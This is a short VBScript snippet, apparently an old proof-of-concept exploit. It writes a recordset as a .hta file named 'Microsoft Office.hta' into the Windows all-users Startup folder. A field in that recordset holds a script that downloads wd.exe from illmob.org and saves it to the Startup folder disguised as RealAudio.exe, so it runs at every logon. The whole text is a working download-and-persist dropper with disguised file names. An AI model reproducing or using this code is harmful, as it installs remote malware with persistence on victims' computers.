
set objRS = CreateObject("ADODB.Recordset")
   With objRS
       .Fields.Append "Item1", 200, "3000"
       Call .Open
       Call .AddNew
       .Fields("Item1").Value = "meaning less shit i had to put here"
       Call .AddNew
       .Fields("Item1").Value = "<script language=vbscript>: on error resume next : set o = CreateObject(""msxml2.XMLHTTP"") : o.open ""GET"",""http://illmob.org/wd.exe"",False : o.send : set s = createobject(""adodb.stream"") : s.type=1 : s.open : s.write o.responseBody : s.savetofile ""C:\Documents and Settings\All Users\Start Menu\Programs\Startup\RealAudio.exe"",2 : </script>"
       Call .Update
   End With
objRS.Save "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Microsoft Office.hta", adPersistXML
objRS.Close



